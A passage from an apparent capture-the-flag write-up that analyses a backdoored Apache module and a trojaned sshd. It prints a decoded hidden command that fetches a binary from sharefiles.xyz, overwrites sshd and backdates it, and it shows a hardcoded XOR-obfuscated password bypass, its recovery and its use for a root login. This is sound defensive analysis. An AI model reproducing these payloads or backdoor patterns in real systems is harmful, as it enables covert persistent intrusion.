     2785      4 -rw-r--r--   2 root     root           67 May 11  2021 /usr/lib/python3.9/lib2to3/__main__.py
     2901     12 -rw-r--r--   1 root     root        11653 May 11  2021 /usr/lib/python3.8/lib2to3/main.py
     2785      4 -rw-r--r--   2 root     root           67 May 11  2021 /usr/lib/python3.8/lib2to3/__main__.py
     2050     36 -rw-r--r--   1 root     root        34800 May 17  2021 /usr/lib/apache2/modules/mod_reader.so
    17565     28 -r-x------   1 www-data www-data    27296 May 14  2021 /var/backups/info
    14320     20 -rwxr-xr-x   1 root     root        17912 May 15  2021 /var/lib/.main
    50834      4 -rw-r--r--   1 root     root           69 May 17  2021 /etc/apache2/mods-available/reader.load
    50832      0 lrwxrwxrwx   1 root     root           29 May 17  2021 /etc/apache2/mods-enabled/reader.load -> ../mods-available/reader.load

```

The last two look interesting. They are related to an Apache module. The module itself is a few files up, also modified on 17 May.

The file in `/etc/apache2/mods-available` points back to the binary:

```

steven@production:/var/mail$ cat /etc/apache2/mods-available/reader.load 
LoadModule reader_module      /usr/lib/apache2/modules/mod_reader.so

```

### mod\_reader

I’ll pull a copy of `mod_reader.so` back to my VM and open it in Ghidra. Looking at the functions, `reader_register_hooks` is interesting. It just calls two other functions:

```

void reader_register_hooks(apr_pool_t *p)

{
  ap_hook_handler(reader_handler,0,0,10);
  ap_hook_post_config(hook_post_config,0,0,0);
  return;
}

```

`ap_hook_handler` registers the function to handle requests. The 10 at [the end](https://apr.apache.org/docs/apr/trunk/group___a_p_r___util___hook.html) is `ARP_HOOK_MIDDLE`, which says that this hook should run somewhere, but isn’t specific about being at the start or end. `reader_handler` doesn’t seem to do anything interesting.

`ap_hook_post_config` will register the function `hook_post_config` to run after each start of the service, and it’s more interesting:

```

int hook_post_config(apr_pool_t *pconf,apr_pool_t *plog,apr_pool_t *ptemp,server_rec *s)

{
  long lVar1;
  long in_FS_OFFSET;
  char *args [4];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  pid = fork();
  if (pid == 0) {
    b64_decode("d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0 ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk"
               ,(char *)0x0);
    args[2] = (char *)0x0;
    args[3] = (char *)0x0;
    args[0] = "/bin/bash";
    args[1] = "-c";
    execve("/bin/bash",args,(char **)0x0);
  }
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

```

It’s doing a similar thing to the previous backdoor, forking off a call to `bash`, this time with a base64-encoded string. That string decodes to:

```

oxdf@hacky$ echo "d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk" | base64 -d
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd

```

With whitespace:

```

wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; 
touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd

```

It’s getting a `sshd` binary and setting the timestamps to match a file already on the disk. I’ll pull back a copy of that as well.

### sshd

This is a much larger program, but looking through the various functions, there’s a bunch that start with `auth_`:

![image-20220128141252543](https://0xdfimages.gitlab.io/img/image-20220128141252543.png)

`auth_password` seems like a good place to leave a backdoor, and it is:

```

int auth_password(ssh *ssh,char *password)

{
  Authctxt *ctxt;
  passwd *ppVar1;
  int iVar2;
  uint ret;
  byte *pbVar3;
  byte *pbVar4;
  size_t sVar5;
  byte bVar6;
  int iVar7;
  long in_FS_OFFSET;
  char backdoor [31];
  byte local_39 [9];
  long canary;
  
  bVar6 = 0xd6;
  ctxt = (Authctxt *)ssh->authctxt;
  canary = *(long *)(in_FS_OFFSET + 0x28);
  backdoor._28_2_ = 0xa9f4;
  ppVar1 = ctxt->pw;
  iVar7 = ctxt->valid;
  backdoor._24_4_ = 0xbcf0b5e3;
  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
  backdoor[30] = -0x5b;
  backdoor._0_4_ = 0xf0e7abd6;
  backdoor._4_4_ = 0xa4b3a3f3;
  backdoor._8_4_ = 0xf7bbfdc8;
  backdoor._12_4_ = 0xfdb3d6e7;
  pbVar3 = (byte *)backdoor;
  while( true ) {
    pbVar4 = pbVar3 + 1;
    *pbVar3 = bVar6 ^ 0x96;
    if (pbVar4 == local_39) break;
    bVar6 = *pbVar4;
    pbVar3 = pbVar4;
  }
  iVar2 = strcmp(password,backdoor);
  ret = 1;
  if (iVar2 != 0) {
    sVar5 = strlen(password);
    ret = 0;
    if (sVar5 < 0x401) {
      if ((ppVar1->pw_uid == 0) && (options.permit_root_login != 3)) {
        iVar7 = 0;
      }
      if ((*password != '\0') ||
         (ret = options.permit_empty_passwd, options.permit_empty_passwd != 0)) {
        if (auth_password::expire_checked == 0) {
          auth_password::expire_checked = 1;
          iVar2 = auth_shadow_pwexpired(ctxt);
          if (iVar2 != 0) {
            ctxt->force_pwchange = 1;
          }
        }
        iVar2 = sys_auth_passwd(ssh,password);
        if (ctxt->force_pwchange != 0) {
          auth_restrict_session(ssh);
        }
        ret = (uint)(iVar2 != 0 && iVar7 != 0);
      }
    }
  }
  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
    return ret;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

```

There’s a buffer called `backdoor` that’s set and then XORed by 0x96. Then the password is compared to that value, and if so, the return value is set to one, and the rest of the function is skipped.

### Recover Password

The most challenging part here is to get all the bytes in the right order. There are 31 bytes set here, and the byte order such that the first byte is the last two characters in each word. I’ve labeled some of the bytes 0 to 30 in red in this image:

![](https://0xdfimages.gitlab.io/img/undetected-sshd-bytes.png)

I’ll combine all those to make this string, using a Python terminal starting with the byte I’ve labeled 30 going down to 0:

```

oxdf@hacky$ python3
Python 3.8.10 (default, Mar 15 2022, 12:22:08) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> backdoor_str = 'a5a9f4bcf0b5e3b2d6f4a0fda0b3d6fdb3d6e7f7bbfdc8a4b3a3f3f0e7abd6'

```

Byte 30 shows as -0x5b in Ghidra for some reason, but this converts to a positive hex value by adding 256 (0x100) to get 0xa5. I’ve put these in 30–>1 so that I can easily copy these four and eight byte words without having to swap their byte order. But that leaves the first byte last, so I need to flip all the bytes (after I convert it from binary, or else it would swap the characters within bytes, and that’d be wrong).

```

>>> import binascii
>>> backdoor = binascii.unhexlify(backdoor_str)[::-1]

```

All that remains is to loop over each byte and xor it with 0x96, and then convert back to a character and print:

```

>>> print(''.join([chr(b ^ 0x96) for b in backdoor]))
@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3

```

To save my work, I’ll put these lines into a short Python script to have in the future.

```

oxdf@hacky$ python3 backdoor.py 
@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3

```

### SSH

I can use that to connect as root over SSH:

```

oxdf@hacky$ sshpass -p $(python3 backdoor.py) ssh root@10.10.11.146
Last login: Fri Jan 28 13:15:56 2022
root@production:~# 

```

And grab `root.txt`:

```

root@production:~# cat root.txt
6b01a2a7************************

```